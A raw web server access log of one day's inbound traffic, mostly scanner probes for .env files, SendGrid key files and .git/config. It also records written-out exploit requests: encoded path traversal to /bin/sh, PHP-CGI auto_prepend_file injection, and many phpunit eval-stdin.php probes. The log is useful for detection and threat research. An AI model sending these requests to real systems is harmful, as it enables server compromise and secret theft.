172.206.143.118 - - [13/Jan/2025:05:49:04 +0000] "MGLNDD_35.220.248.27_80\n" 400 526 "-" "-"
78.153.140.148 - - [13/Jan/2025:05:54:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:05:54:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
79.7.120.56 - - [13/Jan/2025:05:58:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.189.182.234 - - [13/Jan/2025:06:08:42 +0000] "GET / HTTP/1.1" 400 526 "-" "-"
195.3.223.55 - - [13/Jan/2025:06:12:31 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
74.82.47.4 - - [13/Jan/2025:06:14:15 +0000] "\x16\x03\x01" 400 526 "-" "-"
148.153.45.238 - - [13/Jan/2025:06:26:41 +0000] "GET /jiT5 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [13/Jan/2025:06:26:42 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/jiT5" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [13/Jan/2025:06:26:42 +0000] "GET /bEDr HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [13/Jan/2025:06:26:42 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/bEDr" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [13/Jan/2025:06:26:43 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [13/Jan/2025:06:26:43 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [13/Jan/2025:06:26:43 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [13/Jan/2025:06:26:43 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
185.16.39.104 - - [13/Jan/2025:06:29:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
205.210.31.70 - - [13/Jan/2025:06:36:02 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.93 - - [13/Jan/2025:06:49:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:06:49:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [13/Jan/2025:06:57:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [13/Jan/2025:07:13:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.34.212.75 - - [13/Jan/2025:07:19:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
198.235.24.152 - - [13/Jan/2025:07:25:20 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
94.102.56.99 - - [13/Jan/2025:07:28:00 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
94.102.56.99 - - [13/Jan/2025:07:28:00 +0000] "GET / HTTP/1.1" 200 947 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 zgrab/0.x"
94.102.56.99 - - [13/Jan/2025:07:28:00 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
124.156.193.7 - - [13/Jan/2025:07:34:32 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
78.153.140.93 - - [13/Jan/2025:07:48:44 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:07:48:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.41.206.176 - - [13/Jan/2025:07:48:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:57 +0000] "GET / HTTP/1.1" 200 1742 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:57 +0000] "GET /sendgrid.env HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:57 +0000] "GET /sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:57 +0000] "GET /sendgrid_email/.env HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:57 +0000] "GET /config/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:58 +0000] "GET /.env.sendgrid HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:58 +0000] "GET /sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:59 +0000] "GET /sendgrid_keys.js HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:59 +0000] "GET /private/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:59 +0000] "GET /config/private/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:48:59 +0000] "GET /backup/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:00 +0000] "GET /secrets/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:00 +0000] "GET /wp-content/uploads/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:00 +0000] "GET /wp-content/plugins/wp-mail-smtp/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:00 +0000] "GET /wp-content/plugins/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:00 +0000] "GET /modules/contrib/sendgrid_mail/sendgrid_mail.module HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:01 +0000] "GET /modules/contrib/sendgrid_mail/sendgrid_mail.settings.php HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:01 +0000] "GET /modules/contrib/sendgrid_mail/sendgrid_mail.services.yml HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:01 +0000] "GET /modules/contrib/sendgrid_mail/translations/sendgrid_mail.fr.po HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:01 +0000] "GET /wp-content/themes/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:01 +0000] "GET /wp-content/uploads/wp-mail-smtp/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:02 +0000] "GET /wp-content/backup/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:02 +0000] "GET /wp-includes/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:02 +0000] "GET /wp-content/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:02 +0000] "GET /wp-admin/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:02 +0000] "GET /sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:03 +0000] "GET /.sendgrid/credentials HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:03 +0000] "GET /.sendgrid/config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:03 +0000] "GET /config/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:03 +0000] "GET /config/sendgrid_config.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:03 +0000] "GET /private/sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:04 +0000] "GET /private/sendgrid_config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:04 +0000] "GET /backup/sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:04 +0000] "GET /backup/sendgrid_config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:04 +0000] "GET /secrets/sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:04 +0000] "GET /secrets/sendgrid_config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:05 +0000] "GET /config/sendgrid.py HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:05 +0000] "GET /settings/sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:05 +0000] "GET /settings/sendgrid_config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:05 +0000] "GET /config/settings/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:05 +0000] "GET /config/settings/sendgrid_config.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:06 +0000] "GET /config/env/sendgrid.env HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:06 +0000] "GET /config/env/sendgrid_keys.env HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:06 +0000] "GET /instance/sendgrid_keys.py HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:06 +0000] "GET /sendgrid_keys.txt HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:06 +0000] "GET /sendgrid_keys.py HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:07 +0000] "GET /keys/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:07 +0000] "GET /api_keys/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:07 +0000] "GET /config/packages/sendgrid.yaml HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:07 +0000] "GET /config/secrets/prod/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:07 +0000] "GET /config/secrets/dev/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:08 +0000] "GET /config/sendgrid.php HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:08 +0000] "GET /storage/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:08 +0000] "GET /backup/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:08 +0000] "GET /secrets/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:08 +0000] "GET /config/sendgrid.js HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:07:49:09 +0000] "GET /private/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
5.181.190.248 - - [13/Jan/2025:07:51:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
93.174.93.12 - - [13/Jan/2025:08:14:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
78.153.140.148 - - [13/Jan/2025:08:37:21 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:08:37:22 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:08:52:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:08:52:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:09:02:28 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:09:02:29 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:09:26:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:09:26:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
198.235.24.19 - - [13/Jan/2025:09:33:52 +0000] "\x16\x03\x01" 400 526 "-" "-"
198.235.24.19 - - [13/Jan/2025:09:33:52 +0000] "\x16\x03\x01" 400 526 "-" "-"
34.147.244.101 - - [13/Jan/2025:09:57:06 +0000] "\x16\x03\x01" 400 526 "-" "-"
34.147.244.101 - - [13/Jan/2025:09:57:08 +0000] "OPTIONS / HTTP/1.0" 200 1761 "-" "-"
178.215.236.132 - - [13/Jan/2025:09:58:11 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:10:38:23 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:10:38:23 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.247.137.154 - - [13/Jan/2025:10:41:18 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
126.82.179.196 - - [13/Jan/2025:10:48:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [13/Jan/2025:10:54:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
147.185.132.87 - - [13/Jan/2025:11:03:19 +0000] "\x16\x03\x01" 400 526 "-" "-"
147.185.132.87 - - [13/Jan/2025:11:03:19 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.93 - - [13/Jan/2025:11:06:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:11:06:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [13/Jan/2025:11:18:58 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
65.49.20.69 - - [13/Jan/2025:11:33:56 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
65.49.20.69 - - [13/Jan/2025:11:36:49 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0"
65.49.20.69 - - [13/Jan/2025:11:37:47 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.39.104 - - [13/Jan/2025:11:43:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
216.176.69.27 - - [13/Jan/2025:12:02:56 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [13/Jan/2025:12:04:01 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:12:04:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
195.3.223.55 - - [13/Jan/2025:12:04:50 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [13/Jan/2025:12:07:38 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:12:07:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [13/Jan/2025:12:12:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
49.175.89.60 - - [13/Jan/2025:12:12:24 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:24 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:25 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:26 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:26 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:27 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:28 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:28 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:29 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:29 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:30 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:30 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:31 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:31 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:32 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:32 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:33 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:33 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:34 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:34 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:35 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:35 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:36 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:37 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:37 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:38 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:38 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:39 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:39 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:40 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:40 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:41 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:42 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:42 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:43 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:44 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:44 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:45 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:45 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
